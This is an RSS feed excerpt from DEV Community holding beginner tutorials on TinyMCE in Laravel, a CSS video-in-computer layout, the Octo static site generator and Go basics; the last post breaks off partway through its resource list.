<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
  <channel>
    <title>DEV Community</title>
    <author>DEV Community</author>
    <description>A constructive and inclusive social network for software developers. With you every step of your journey.</description>
    <link>https://dev.to</link>
    <language>en</language>
    <item>
      <title>How To Install TinyMCE Editor In Laravel</title>
      <author>Techsolutionstuff</author>
      <pubDate>Wed, 15 Sep 2021 03:26:28 +0000</pubDate>
      <link>https://dev.to/techsolutionstuff/how-to-install-tinymce-editor-in-laravel-594f</link>
      <guid>https://dev.to/techsolutionstuff/how-to-install-tinymce-editor-in-laravel-594f</guid>
      <description>&lt;p&gt;In this artical we will give you example how to Install tinymce editor in laravel, Tinymce editor is rich-text opensource editor, It has the ability to convert HTML textarea fields or other HTML elements to editor instances, here we will see how to use tinymce editor in laravel.&lt;/p&gt;

&lt;p&gt;Tinymce provides many features like PowerPaste, Spell Checker Pro, Image Upload, Accessibility Checker, Link Checker, Format Painter, Premium Skins &amp;amp; Icons and many more.&lt;/p&gt;

&lt;p&gt;So, let's see how to implement tinymce editor in laravel.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;&amp;lt;html&amp;gt;
&amp;lt;title&amp;gt;How To Install TinyMCE Editor In Laravel - techsolutionstuff.com&amp;lt;/title&amp;gt;
&amp;lt;head&amp;gt;
  &amp;lt;script src="https://cdn.tiny.cloud/1/no-api-key/tinymce/5/tinymce.min.js" referrerpolicy="origin"&amp;gt;&amp;lt;/script&amp;gt;

&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
    &amp;lt;h1 style="text-align: center;"&amp;gt;How To Install TinyMCE Editor in Laravel - techsolutionstuff.com&amp;lt;/h1&amp;gt;
  &amp;lt;textarea id="texteditor"&amp;gt; &amp;lt;/textarea&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&amp;lt;script&amp;gt;
tinymce.init({
    selector: '#texteditor',
    height:350,
});
&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--ATayA2vI--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/dzzm81y5nuhbrdt0yfcf.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--ATayA2vI--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/dzzm81y5nuhbrdt0yfcf.png" alt="How To Install TinyMCE Editor In Laravel&amp;lt;br&amp;gt;
"&gt;&lt;/a&gt;&lt;/p&gt;




&lt;p&gt;You might also like :&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;em&gt;&lt;a href="https://www.techsolutionstuff.com/post/how-to-generate-qrcode-in-laravel"&gt;Read More : How To Generate QRcode In Laravel&lt;/a&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;em&gt;&lt;a href="https://techsolutionstuff.com/post/how-to-generate-barcode-in-laravel"&gt;Read More : How To Generate Barcode In Laravel&lt;/a&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;em&gt;&lt;a href="https://www.techsolutionstuff.com/post/how-to-delete-multiple-records-using-checkbox-in-laravel"&gt;Read More : How To Delete Multiple Records Using Checkbox In Laravel&lt;/a&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
      <category>laravel</category>
      <category>tinymce</category>
      <category>texteditor</category>
      <category>javascript</category>
    </item>
    <item>
      <title>CSS - Video Inside A Computer</title>
      <author>CoderZ90</author>
      <pubDate>Wed, 15 Sep 2021 03:14:57 +0000</pubDate>
      <link>https://dev.to/official_fire/css-video-inside-a-computer-5ghp</link>
      <guid>https://dev.to/official_fire/css-video-inside-a-computer-5ghp</guid>
      <description>&lt;h1&gt;
  &lt;a href="#create-a-pure-css-video-inside-a-computer"&gt;
  &lt;/a&gt;
  Create a pure css video inside a computer üî•
&lt;/h1&gt;



&lt;p&gt;Guys Before we begin i want to tell you guys that üòä Please subscribe to my channel - &lt;a href="https://youtube.com/codingfire?sub_confrimation=1"&gt;https://youtube.com/codingfire?sub_confrimation=1&lt;/a&gt; please.. But More than that hope you are safe and happy üíñüî•&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#step-one"&gt;
  &lt;/a&gt;
  Step One
&lt;/h2&gt;

&lt;p&gt;So the first step is to download the necessary image and video, in this project we will need 1 image and 1 video. image is for the frame of the computer and video which will be inside the computer. Guys the tutorial video is also there so if you want to check feel free to do it üòäüôè&lt;/p&gt;

&lt;p&gt;See this image -&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--Gtn1AgWY--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/dpokhp4jlh9do39gz2ox.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--Gtn1AgWY--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/dpokhp4jlh9do39gz2ox.png" alt="One image used is the frame and the video inside the computer"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#here-are-the-links-to-download-the-image-and-the-video"&gt;
  &lt;/a&gt;
  Here are the links to download the image and the video üòä
&lt;/h3&gt;

&lt;p&gt;Image Link - &lt;a href="https://raw.githubusercontent.com/CoderZ90/Video-Inside-Computer-Using-CSS/main/computer.png"&gt;https://raw.githubusercontent.com/CoderZ90/Video-Inside-Computer-Using-CSS/main/computer.png&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Video Link - &lt;a href="https://github.com/CoderZ90/Video-Inside-Computer-Using-CSS/blob/main/video.mp4"&gt;https://github.com/CoderZ90/Video-Inside-Computer-Using-CSS/blob/main/video.mp4&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#step-02"&gt;
  &lt;/a&gt;
  Step 02
&lt;/h3&gt;

&lt;p&gt;So in this step we will start from html and the step 03 will be the css, the html is very small and basic&lt;/p&gt;

&lt;p&gt;Here we are creating a &lt;code&gt;&amp;lt;div&amp;gt;&lt;/code&gt; with the class of computer and then we are inserting our image and then our video&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight html"&gt;&lt;code&gt;&lt;span class="cp"&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&lt;span class="c"&gt;&amp;lt;!-- Coding by CodingFire - youtube.com/CodingFire --&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;html&lt;/span&gt; &lt;span class="na"&gt;lang=&lt;/span&gt;&lt;span class="s"&gt;"en"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;meta&lt;/span&gt; &lt;span class="na"&gt;charset=&lt;/span&gt;&lt;span class="s"&gt;"UTF-8"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;meta&lt;/span&gt; &lt;span class="na"&gt;http-equiv=&lt;/span&gt;&lt;span class="s"&gt;"X-UA-Compatible"&lt;/span&gt; &lt;span class="na"&gt;content=&lt;/span&gt;&lt;span class="s"&gt;"IE=edge"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;meta&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"viewport"&lt;/span&gt; &lt;span class="na"&gt;content=&lt;/span&gt;&lt;span class="s"&gt;"width=device-width, initial-scale=1.0"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;link&lt;/span&gt; &lt;span class="na"&gt;rel=&lt;/span&gt;&lt;span class="s"&gt;"stylesheet"&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;"style.css"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;title&amp;gt;&lt;/span&gt;CSS - Video Inside a Computer | CodingFire&lt;span class="nt"&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
   &lt;span class="nt"&gt;&amp;lt;div&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"computer"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
       &lt;span class="c"&gt;&amp;lt;!-- Computer Image --&amp;gt;&lt;/span&gt;
       &lt;span class="nt"&gt;&amp;lt;img&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"computerBorder"&lt;/span&gt; &lt;span class="na"&gt;src=&lt;/span&gt;&lt;span class="s"&gt;"./computer.png"&lt;/span&gt; &lt;span class="na"&gt;alt=&lt;/span&gt;&lt;span class="s"&gt;""&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
       &lt;span class="c"&gt;&amp;lt;!-- video --&amp;gt;&lt;/span&gt;
       &lt;span class="nt"&gt;&amp;lt;video&lt;/span&gt; &lt;span class="na"&gt;src=&lt;/span&gt;&lt;span class="s"&gt;"video.mp4"&lt;/span&gt; &lt;span class="na"&gt;muted&lt;/span&gt; &lt;span class="na"&gt;loop&lt;/span&gt; &lt;span class="na"&gt;autoplay&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;/video&amp;gt;&lt;/span&gt;
   &lt;span class="nt"&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h1&gt;
  &lt;a href="#step-03"&gt;
  &lt;/a&gt;
  Step 03
&lt;/h1&gt;

&lt;p&gt;So the last step is css&lt;/p&gt;

&lt;p&gt;here the main part is we are fitting the video and computer frame image in such a way that it look like the video is inside the computer. We are using position absolute and relative to do it. check the css code below btw source code is also providing and video also&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight css"&gt;&lt;code&gt;
&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nl"&gt;margin&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;padding&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;box-sizing&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;border-box&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="nt"&gt;body&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nl"&gt;min-height&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;100vh&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;display&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;flex&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;align-items&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;center&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;justify-content&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;center&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;background&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;#f1f1f1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="nc"&gt;.computer&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nl"&gt;position&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;relative&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;display&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;flex&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;align-items&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;center&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;justify-content&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;center&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;width&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;450px&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;height&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;450px&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;overflow&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;hidden&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="nc"&gt;.computerBorder&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nl"&gt;position&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;absolute&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;top&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;50%&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;left&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;50%&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;transform&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;translate&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="m"&gt;-50%&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="m"&gt;-50%&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nl"&gt;width&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;450px&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;height&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;350px&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;overflow&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;hidden&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;filter&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;drop-shadow&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="m"&gt;2px&lt;/span&gt; &lt;span class="m"&gt;10px&lt;/span&gt; &lt;span class="n"&gt;rgba&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="m"&gt;0.2&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="nt"&gt;video&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nl"&gt;position&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;absolute&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;top&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;14%&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;left&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;50%&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;transform&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;translateX&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="m"&gt;-50%&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nl"&gt;width&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;94%&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="c"&gt;/* Put this value too  */&lt;/span&gt;
    &lt;span class="nl"&gt;z-index&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;-1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;I hope you like the blog and it helped you üíñüòä&lt;br&gt;
as i said the source code and the video is also available so here it is &lt;/p&gt;

&lt;p&gt;Source Code Link - &lt;a href="https://github.com/CoderZ90/Video-Inside-Computer-Using-CSS"&gt;https://github.com/CoderZ90/Video-Inside-Computer-Using-CSS&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Video Link - this video is made by me and please subscribe to my channel it really motivates me to do more &lt;/p&gt;

&lt;p&gt;&lt;a href="https://www.youtube.com/watch?v=IWiYWezOqm8"&gt;https://www.youtube.com/watch?v=IWiYWezOqm8&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Happy Coding üíñ&lt;/p&gt;

</description>
      <category>html</category>
      <category>css</category>
      <category>webdev</category>
      <category>beginners</category>
    </item>
    <item>
      <title>Octo: The Open Source Static Site Generator</title>
      <author>Luigi Zaccagnini</author>
      <pubDate>Wed, 15 Sep 2021 02:56:52 +0000</pubDate>
      <link>https://dev.to/luigizaccagnini/open-source-static-site-generator-3953</link>
      <guid>https://dev.to/luigizaccagnini/open-source-static-site-generator-3953</guid>
      <description>&lt;p&gt;After my &lt;a href="https://dev.to/luigizaccagnini/starting-my-journey-in-opensource-1m4n"&gt;first blog post&lt;/a&gt; I decided what was a better way to start into open source then building my own open source project! I then built a static site generator in Javascript called &lt;a href="https://github.com/LuigiZaccagnini/octo"&gt;Octo&lt;/a&gt;. The project was created with the idea of shipping a finished product is better than shipping when the product is perfect. This is important because if I shipped a perfect product, I would not be writing this post and most likely would still be writing code for an infinite amount of time.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#what-is-a-static-site-generator"&gt;
  &lt;/a&gt;
  What is a Static Site Generator?
&lt;/h2&gt;

&lt;p&gt;A SSG(static site generator) is a tool that creates static HTML pages based off of a template or some raw data provided. Octo is designed to only accept .txt files and create static html documents based off of the content within the text files. Octo will read the text data and make paragraph elements every time there is a space between content. &lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#tool-setup"&gt;
  &lt;/a&gt;
  Tool Setup
&lt;/h2&gt;

&lt;h3&gt;
  &lt;a href="#installation"&gt;
  &lt;/a&gt;
  Installation
&lt;/h3&gt;

&lt;p&gt;This builds Octo so you can access it anywhere on your computer using the &lt;code&gt;octo&lt;/code&gt; command. &lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Clone the repository &lt;/li&gt;
&lt;li&gt;cd into the folder &lt;/li&gt;
&lt;li&gt;run npm i to install all dependencies &lt;/li&gt;
&lt;li&gt;run npm install -g .&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;
  &lt;a href="#features"&gt;
  &lt;/a&gt;
  Features
&lt;/h2&gt;

&lt;h3&gt;
  &lt;a href="#input"&gt;
  &lt;/a&gt;
  Input
&lt;/h3&gt;

&lt;p&gt;The &lt;code&gt;-i or --input&lt;/code&gt; flag means the input path. This will look for all texts files with the given path. You can give a .txt file as input or a directory. This is a required field for the program to work. Any files/directories with spaces should be entered with quotes: &lt;/p&gt;

&lt;pre&gt;octo -i "Sherlock Holmes Selected Stories/test.txt"&lt;/pre&gt;


&lt;center&gt;&lt;strong&gt;Only text files work with this program.&lt;/strong&gt;&lt;/center&gt;
&lt;br&gt;

&lt;h4&gt;
  &lt;a href="#examples"&gt;
  &lt;/a&gt;
  Examples
&lt;/h4&gt;
&lt;h5&gt;
  &lt;a href="#file-input"&gt;
  &lt;/a&gt;
  File Input
&lt;/h5&gt;

&lt;p&gt;This will take the content from the text file and output a HTML file.&lt;/p&gt;

&lt;pre&gt;
    octo -i test.txt
&lt;/pre&gt;

&lt;h5&gt;
  &lt;a href="#directory-input"&gt;
  &lt;/a&gt;
  Directory Input
&lt;/h5&gt;

&lt;p&gt;This will go though a directory named test and look for all nested .txt files.&lt;/p&gt;

&lt;pre&gt;
    octo -i test
&lt;/pre&gt;

&lt;h3&gt;
  &lt;a href="#output"&gt;
  &lt;/a&gt;
  Output
&lt;/h3&gt;

&lt;p&gt;The output allows the user to specify the path where the files/directories can be exported. &lt;br&gt;
This is not a required field and will default to './dist' if no option is given.&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#examples"&gt;
  &lt;/a&gt;
  Examples
&lt;/h4&gt;

&lt;p&gt;The &lt;code&gt;-o or --output&lt;/code&gt; flag means the output path. This will create a folder called htmlFiles outside of the current directory.&lt;/p&gt;

&lt;pre&gt;
    octo -i test.txt -o ../hmtlFiles
&lt;/pre&gt;

&lt;h3&gt;
  &lt;a href="#recursive-file-searching"&gt;
  &lt;/a&gt;
  Recursive File Searching
&lt;/h3&gt;

&lt;p&gt;If a input is a directory, Octo will recursively go through all the child directories and convert all the text files into HTML.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#conclusion"&gt;
  &lt;/a&gt;
  Conclusion
&lt;/h2&gt;

&lt;p&gt;After creating my own open source project, I was able to grow as a software developer! Although it may seem to be not as difficult of a task, the few things that were difficult for me were: &lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Publishing my code online for everyone to see&lt;/li&gt;
&lt;li&gt;Submitting code that could possibly be buggy&lt;/li&gt;
&lt;li&gt;Not having a 100% completed software&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Those thoughts might have made it difficult at first but, I was able to move past this and understand that &lt;strong&gt;these things are okay!&lt;/strong&gt; Comment some features that you would like to see with this project, I would love to add them to the Github repository. I am also excited to get pull requests from people in the community to help make this tool better! If you want to contribute to the project or check out the link to the sample site, the links will be under here!&lt;/p&gt;

&lt;div class="table-wrapper-paragraph"&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Source&lt;/th&gt;
&lt;th&gt;Link&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Github Repository&lt;/td&gt;
&lt;td&gt;&lt;a href="https://github.com/LuigiZaccagnini/octo"&gt;https://github.com/LuigiZaccagnini/octo&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Sample Site&lt;/td&gt;
&lt;td&gt;&lt;a href="https://luigizaccagnini.github.io/octo/"&gt;https://luigizaccagnini.github.io/octo/&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;&lt;/div&gt;

</description>
      <category>javascript</category>
      <category>opensource</category>
      <category>showdev</category>
    </item>
    <item>
      <title>Go/Golang Basics</title>
      <author>Tarun Kumar J</author>
      <pubDate>Wed, 15 Sep 2021 02:51:01 +0000</pubDate>
      <link>https://dev.to/tarunj096/go-golang-basics-246c</link>
      <guid>https://dev.to/tarunj096/go-golang-basics-246c</guid>
      <description>&lt;p&gt;&lt;strong&gt;Go&lt;/strong&gt; is Open Source Programming language that is  &lt;code&gt;statically typed&lt;/code&gt; . Although it is statically typed, It's so fast that it feels like it's an Interpreted language. &lt;/p&gt;

&lt;p&gt;So let's start with the basics. As Go is a Compiled language, Its Code has to be converted to an executable/binary file. Go has a compiler that translates the code into a binary file.&lt;/p&gt;

&lt;p&gt;If your file's name was helloworld.go then to compile it on the terminal, The command would look like this :&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;go build helloworld.go

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The command would create a "helloworld" file. To execute that, call &lt;code&gt;./helloworld&lt;/code&gt;  in the terminal&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;./helloworld

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;There's a run command that both compiles and executes the code. Although the run command will not create a binary file.&lt;/p&gt;

&lt;p&gt;For example to run the command on helloworld.go file, It would look like this:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;go run helloworld.go

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;A Go program should have a package declaration. After the package declaration, We have import statement right below it. It looks like:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;package main

import "fmt"

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Note that the package name has to be enclosed in &lt;code&gt;double quotes&lt;/code&gt; .&lt;/p&gt;

&lt;p&gt;The functions in Go are declared with &lt;code&gt;func&lt;/code&gt; keyword and that is followed by name of the function.&lt;br&gt;
Let's see a basic program.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;package main

import "fmt"

func main() {

        fmt.Println(" Hello World! ")

}

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;In the above program in function main we have used the &lt;code&gt;fmt&lt;/code&gt; package which helps us call Println to print.&lt;/p&gt;

&lt;p&gt;To run the command we use&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;go run main.go

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;This would print the message "Hello World!".&lt;/p&gt;

&lt;p&gt;In Go language, the main package is a special package which is used with the programs that are executable and this package contains main() function. Go automatically calls the main function and there is no need to explicitly call it.&lt;/p&gt;

&lt;p&gt;You can use &lt;strong&gt;go doc&lt;/strong&gt; on the command line for more information about the packages.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;go doc fmt
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The above command gives us information about fmt package. &lt;br&gt;
For more specific information you could use:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;go doc fmt.Println
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;And Lastly, For more information about Go lang ,You can always check the documentation.   &lt;a href="https://golang.org"&gt;&lt;strong&gt;&lt;em&gt;This&lt;/em&gt;&lt;/strong&gt;&lt;/a&gt; is the official site üíØ.&lt;/p&gt;

&lt;p&gt;If you are learning Go language and would want to know more, Below are some resources üî•.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#resources"&gt;
  &lt;/a&gt;
  Resources:
&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Watch a video course on &lt;a href="https://www.youtube.com/watch?v=YS4e4q9oBaU"&gt; &lt;strong&gt;freecodecamp&lt;/strong&gt;&lt;/a&gt; .&lt;/p&gt;&lt;/li&gt;
